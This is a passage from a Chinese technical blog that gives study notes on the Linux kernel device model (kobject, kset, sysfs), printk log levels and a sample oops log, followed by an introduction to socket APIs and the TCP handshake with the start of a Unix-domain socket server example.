<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>        *name;                   <span class="comment">/* kobject 名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">entry</span>;</span>               <span class="comment">/* kobject 链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span>        *<span class="title">parent</span>;</span>             <span class="comment">/* kobject 的父对象，说明kobject是有层次结构的 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kset</span>        *<span class="title">kset</span>;</span>                   <span class="comment">/* kobject 的集合，接下来有详细介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span>    *<span class="title">ktype</span>;</span>              <span class="comment">/* kobject 的类型，接下来有详细介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysfs_dirent</span>    *<span class="title">sd</span>;</span>                 <span class="comment">/* 在sysfs中，这个结构体表示kobject的一个inode结构体，sysfs之后也会介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span>        <span class="title">kref</span>;</span>                    <span class="comment">/* 提供 kobject 的引用计数 */</span></span><br><span class="line">    <span class="comment">/* 一些标志位  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_initialized:<span class="number">1</span>;       </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_in_sysfs:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_add_uevent_sent:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_remove_uevent_sent:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> uevent_suppress:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>kobject 本身不代表什么实际的内容，一般都是嵌在其他数据结构中来发挥作用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>    <span class="comment">/* 表示kset中所有kobject的链表 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> list_lock;     <span class="comment">/* 用于保护 list 的自旋锁*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>      <span class="comment">/* kset中嵌入的一个kobject，使得kset也可以表现的像一样kobject一样*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kset_uevent_ops</span> *<span class="title">uevent_ops</span>;</span>  <span class="comment">/* 处理kset中kobject的热插拔事件 提供了与用户空间热插拔进行通信的机制 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>cdev 中嵌入了 kobject 之后，就可以通过 cdev-&gt;kboj.parent 建立 cdev 之间的层次关系，通过 cdev-&gt;kobj.entry 获取关联的所有 cdev 设备等 </li>
<li>总之，嵌入了 kobject 之后，cdev 设备之间就有了树结构关系，cdev 设备和其他设备之间也有可层次关系 </li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661852969399-1666871176498.png" class width="1661852969399"> 
<p><strong>sysfs文件系统</strong></p>
<p>sysfs 文件系统是一个处于内存中的虚拟文件系统，它为我们提供 kobject 对象层次结构的视图，帮助用户可以以一个简单文件系统的方式来观察各种设备的拓扑结构：</p>
<ul>
<li>sysfs 代替了先前处于 proc 下的设备文件</li>
<li>sysfs 就被挂载在 sys 目录中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ ls /sys</span><br><span class="line">block  class  devices   fs          kernel  power</span><br><span class="line">bus    dev    firmware  hypervisor  module</span><br></pre></td></tr></table></figure>
<ul>
<li>block：每个子目录对应一个系统中已经注册的块设备</li>
<li>bus：提供了一个系统的总线视图</li>
<li>class：包含了以高层功能逻辑组织起来的系统设备视图</li>
<li>dev：已经注册的设备结点视图</li>
<li>devices：系统中设备拓扑结构视图（该目录将设备模型导出到用户空间）</li>
<li>firmware：包含一些诸如 ACPI EDD EFI 等底层子系统的特殊树</li>
<li>fs：已注册文件系统的视图</li>
<li>kernel：包含内核配置项和状态信息</li>
<li>module：包含系统已加载模块的信息</li>
<li>power：包含系统范围的电源管理数据</li>
</ul>
<h2 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h2><p><strong>printk</strong></p>
<p>内核提供的打印函数 <code>printk</code> 和C语言提供的 <code>printf</code> 功能几乎相同：</p>
<ul>
<li><code>printk</code> 的弹性极佳，可以在任何时候进行调用</li>
<li><code>printk</code> 和 <code>printf</code> 的区别就在于，前者可以提供一个日志等级</li>
<li>内核会根据其日志等级来判断是否在终端上打印消息</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>日志等级</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>KERN_EMERG</td>
<td>一个紧急情况</td>
</tr>
<tr>
<td>KERN_ALERT</td>
<td>一个需要被立刻注意到的错误</td>
</tr>
<tr>
<td>KERN_CRIT</td>
<td>一个临界情况</td>
</tr>
<tr>
<td>KERN_ERR</td>
<td>一个错误</td>
</tr>
<tr>
<td>KERN_WARNING</td>
<td>一个警告</td>
</tr>
<tr>
<td>KERN_NOTICE</td>
<td>一个普通情况</td>
</tr>
<tr>
<td>KERN_INFO</td>
<td>一条非正式的消息</td>
</tr>
<tr>
<td>KERN_DEBUG</td>
<td>一条调试消息</td>
</tr>
</tbody>
</table>
</div>
<p><strong>oops</strong></p>
<p>oops 是内核通知用户有错误发生的最常用方式，这个过程包括：</p>
<ul>
<li>向终端上输出错误信息</li>
<li>输出寄存器中保存的信息</li>
<li>输出可供跟踪的回溯线索</li>
</ul>
<p>下面是一个 oops 的实例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">➜  5-oops-mod git:(master) ✗ dmesg | tail -64</span><br><span class="line">[  139.812510] before init</span><br><span class="line">[  139.812512] BUG: kernel NULL pointer dereference, address: 0000000000000000</span><br><span class="line">[  139.812515] #PF: supervisor write access in kernel mode</span><br><span class="line">[  139.812516] #PF: error_code(0x0002) - not-present page</span><br><span class="line">[  139.812517] PGD 0 P4D 0 </span><br><span class="line">[  139.812519] Oops: 0002 [#1] SMP NOPTI</span><br><span class="line">[  139.812521] CPU: 1 PID: 3543 Comm: insmod Tainted: G           OE     5.15.0-48-generic #54~20.04.1-Ubuntu</span><br><span class="line">[  139.812523] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020</span><br><span class="line">[  139.812524] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812528] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812528] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812530] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812530] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812531] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812532] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812533] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812534] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812535] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812536] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812557] PKRU: 55555554</span><br><span class="line">[  139.812558] Call Trace:</span><br><span class="line">[  139.812559]  &lt;TASK&gt;</span><br><span class="line">[  139.812561]  do_one_initcall+0x46/0x1e0</span><br><span class="line">[  139.812565]  ? __cond_resched+0x19/0x40</span><br><span class="line">[  139.812568]  ? kmem_cache_alloc_trace+0x15a/0x420</span><br><span class="line">[  139.812571]  do_init_module+0x52/0x230</span><br><span class="line">[  139.812574]  load_module+0x1376/0x1600</span><br><span class="line">[  139.812576]  __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812578]  ? __do_sys_finit_module+0xbf/0x120</span><br><span class="line">[  139.812579]  __x64_sys_finit_module+0x1a/0x20</span><br><span class="line">[  139.812581]  do_syscall_64+0x59/0xc0</span><br><span class="line">[  139.812583]  ? fput+0x13/0x20</span><br><span class="line">[  139.812584]  ? ksys_mmap_pgoff+0x14b/0x2a0</span><br><span class="line">[  139.812586]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812588]  ? exit_to_user_mode_prepare+0x3d/0x1c0</span><br><span class="line">[  139.812589]  ? syscall_exit_to_user_mode+0x27/0x50</span><br><span class="line">[  139.812591]  ? __x64_sys_mmap+0x33/0x50</span><br><span class="line">[  139.812592]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812593]  ? do_syscall_64+0x69/0xc0</span><br><span class="line">[  139.812594]  entry_SYSCALL_64_after_hwframe+0x61/0xcb</span><br><span class="line">[  139.812596] RIP: 0033:0x7f0f9792173d</span><br><span class="line">[  139.812598] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 8b 0d 23 37 0d 00 f7 d8 64 89 01 48</span><br><span class="line">[  139.812599] RSP: 002b:00007ffdee07d0f8 EFLAGS: 00000246 ORIG_RAX: 0000000000000139</span><br><span class="line">[  139.812600] RAX: ffffffffffffffda RBX: 000055e6a61767c0 RCX: 00007f0f9792173d</span><br><span class="line">[  139.812601] RDX: 0000000000000000 RSI: 000055e6a5c91358 RDI: 0000000000000003</span><br><span class="line">[  139.812602] RBP: 0000000000000000 R08: 0000000000000000 R09: 00007f0f979f8580</span><br><span class="line">[  139.812602] R10: 0000000000000003 R11: 0000000000000246 R12: 000055e6a5c91358</span><br><span class="line">[  139.812603] R13: 0000000000000000 R14: 000055e6a6176760 R15: 0000000000000000</span><br><span class="line">[  139.812604]  &lt;/TASK&gt;</span><br><span class="line">[  139.812605] Modules linked in: oops_mod(OE+) isofs xt_conntrack xt_MASQUERADE nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo xt_addrtype iptable_filter iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 libcrc32c bpfilter br_netfilter bridge stp llc rfcomm aufs overlay bnep vsock_loopback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock binfmt_misc nls_iso8859_1 intel_rapl_msr intel_rapl_common kvm_intel kvm crct10dif_pclmul ghash_clmulni_intel aesni_intel crypto_simd vmw_balloon cryptd btusb input_leds btrtl btbcm btintel bluetooth joydev serio_raw ecdh_generic ecc vmw_vmci mac_hid sch_fq_codel vmwgfx ttm drm_kms_helper cec rc_core fb_sys_fops syscopyarea sysfillrect sysimgblt msr parport_pc ppdev drm lp parport ip_tables x_tables autofs4 hid_generic crc32_pclmul usbhid ahci libahci psmouse hid e1000 mptspi pata_acpi mptscsih mptbase i2c_piix4 scsi_transport_spi</span><br><span class="line">[  139.812636] CR2: 0000000000000000</span><br><span class="line">[  139.812637] ---[ end trace 840a29bcd63bee0c ]---</span><br><span class="line">[  139.812638] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812640] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812641] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812642] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812642] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812643] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812644] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812644] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812645] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812646] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812647] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812664] PKRU: 55555554</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/" class="post-title-link" itemprop="url">网络相关知识：Socket简述</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-18 00:00:37" itemprop="dateCreated datePublished" datetime="2022-08-18T00:00:37+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-04 17:17:58" itemprop="dateModified" datetime="2022-09-04T17:17:58+08:00">2022-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="TCP-IP-amp-UDP"><a href="#TCP-IP-amp-UDP" class="headerlink" title="TCP/IP &amp; UDP"></a>TCP/IP &amp; UDP</h2><p>TCP/IP（Transmission Control Protocol/Internet Protocol）：</p>
<ul>
<li>输控制协议/网间协议，是一个工业标准的协议集（一系列网络协议的总和），它是为广域网设计的</li>
</ul>
<p>UDP（User Data Protocol）：</p>
<ul>
<li>用户数据报协议，是与 TCP 相对应的协议，它是属于 TCP/IP 协议族中的一种 </li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/1641473679035.png" class width="1641473679035"> 
<h2 id="Socket简述"><a href="#Socket简述" class="headerlink" title="Socket简述"></a>Socket简述</h2><p><strong>Socket</strong> 就是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口：</p>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/1641473787712.png" class width="1641473787712"> 
<ul>
<li>socket 可以大大简化“网络通信编程”，我们不需要完全掌握这种编程的各个细节，只需要使用 socket 的接口就可以了</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/1641474031711.png" class width="1641474031711"> 
<h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p>本地的进程间通信（IPC）有很多种方式，但可以总结为下面4类：</p>
<ul>
<li>消息传递（管道、FIFO、消息队列）</li>
<li>同步（互斥量、条件变量、读写锁、文件和写记录锁、信号量）</li>
<li>共享内存（匿名的和具名的）</li>
<li>远程过程调用（Solaris 门和 Sun RPC）</li>
</ul>
<p>在进行网络通信之前，系统需要先“识别”程序，TCP/IP 协议族完成了这个功能：</p>
<ul>
<li>网络层的 <strong>ip地址</strong> 可以唯一标识网络中的主机</li>
<li>传输层的 <strong>协议+端口</strong> 可以唯一标识主机中的应用程序（进程）</li>
</ul>
<p>这样利用三元组（ip地址，协议，端口）就可以标识网络的进程了</p>
<h2 id="Socket函数"><a href="#Socket函数" class="headerlink" title="Socket函数"></a>Socket函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span></span><br></pre></td></tr></table></figure>
<p>用于创建一个 socket 描述符，它唯一标识一个 socket </p>
<ul>
<li>domain：即协议域，又称为协议族（family），协议族决定了 socket 的地址类型，在通信中必须采用对应的地址</li>
<li>type：指定socket类型</li>
<li>protocol：故名思意，就是指定协议</li>
<li>return：返回一个文件描述符 sockfd（描述字它存在于协议族空间中，但没有一个具体的地址）<ul>
<li>如果想要给它赋值一个地址，就必须调用 bind() 函数</li>
<li>否则就当调用 connect() 时系统会自动随机分配一个端口 </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span></span><br></pre></td></tr></table></figure>
<p>把一个地址族中的特定地址赋给 socket </p>
<ul>
<li>sockfd：即socket描述字，它是通过 socket() 函数创建了，唯一标识一个socket，bind()函数就是将给这个描述字绑定一个名字</li>
<li>addr：一个 const struct sockaddr * 指针，指向要绑定给 sockfd 的协议地址，这个地址结构根据地址创建 socket 时的地址协议族的不同而不同</li>
<li>addrlen：地址的长度 </li>
</ul>
<p>通常服务器在启动的时候都会绑定一个众所周知的地址（如ip地址+端口号），用于提供服务，客户就可以通过它来接连服务器</p>
<p>而客户端就不用指定，有系统自动分配一个端口号和自身的ip地址组合就行</p>
<ul>
<li>这就是为什么通常服务器端在 listen 之前会调用 bind，而客户端就不会调用，而是在 connect 时由系统随机生成一个</li>
</ul>
<p>socket 函数创建的 socket 默认是一个主动类型的，listen 函数将 socket 变为被动类型的，等待客户的连接请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>backlog：相应 socket 可以排队的最大连接个数 </li>
</ul>
<p>服务端通过调用 accept 函数来接受客户端的 connect 请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>addr：服务器的 socket 地址 </li>
<li>addrlen：地址的长度</li>
</ul>
<p>客户端通过调用 connect 函数来建立与 TCP 服务器的连接（服务器必须先调用 listen 开启监听）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>addr：服务器的 socket 地址 </li>
<li>addrlen：地址的长度</li>
</ul>
<p>TCP 服务器端依次调用 socket、bind、listen 之后，就会监听指定的 socket 地址了</p>
<p>TCP 客户端依次调用 socket、connect 之后就想 TCP 服务器发送了一个连接请求</p>
<p>TCP 服务器监听到这个请求之后，就会调用 accept 函数取接收请求，这样连接就建立好了 </p>
<ul>
<li>如果 accpet 成功，那么其返回值是由内核自动生成的一个全新的描述字，代表与返回客户的 TCP 连接 </li>
</ul>
<h2 id="三次握手-四次释放"><a href="#三次握手-四次释放" class="headerlink" title="三次握手 四次释放"></a>三次握手 四次释放</h2><p>一，TCP建立连接要进行“三次握手”，即交换三个分组，大致流程如下：</p>
<ul>
<li>客户端向服务器发送一个 SYN J</li>
<li>服务器向客户端响应一个 SYN K，并对 SYN J 进行确认 ACK J+1</li>
<li>客户端再想服务器发一个确认 ACK K+1</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/1641475541309.png" class width="1641475541309"> 
<ul>
<li>当客户端调用 connect 时，触发了连接请求，向服务器发送了 SYN J 包，这时 connect 进入阻塞状态</li>
<li>服务器监听到连接请求，即收到 SYN J 包，调用 accept 函数接收请求向客户端发送 SYN K ，ACK J+1，这时 accept 进入阻塞状态</li>
<li>客户端收到服务器的 SYN K ，ACK J+1 之后，这时 connect 返回，并对 SYN K 进行确认，服务器收到 ACK K+1 时，accept 返回，至此三次握手完毕，连接建立</li>
</ul>
<p>二，socket中有四次握手释放连接的过程，流程如下：</p>
<ul>
<li>某个应用进程首先调用 close 主动关闭连接，这时 TCP 发送一个 FIN M</li>
<li>另一端接收到 FIN M 之后，执行被动关闭，对这个 FIN 进行确认（它的接收也作为文件结束符 EOF 传递给应用进程，因为 FIN 的接收意味着应用进程在相应的连接上再也接收不到额外数据）</li>
<li>一段时间之后，接收到文件结束符 EOF 的应用进程调用 close 关闭它的 socket，这导致它的 TCP 也发送一个 FIN N</li>
<li>接收到这个 FIN 的源发送端 TCP 对它进行确认</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E7%AE%80%E8%BF%B0/1641475703919.png" class width="1641475703919"> 
<ul>
<li>这样每个方向上都有一个 FIN 和 ACK </li>
</ul>
<h2 id="本地进程间通信案例"><a href="#本地进程间通信案例" class="headerlink" title="本地进程间通信案例"></a>本地进程间通信案例</h2><p><strong>服务端</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>   </span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> ret;     </span><br><span class="line">    <span class="keyword">int</span> len;  </span><br><span class="line">    <span class="keyword">int</span> accept_fd;</span><br><span class="line">    <span class="keyword">int</span> socket_fd; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> recv_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clt_addr_len; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">clt_addr</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line"></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">          </span><br><span class="line">    <span 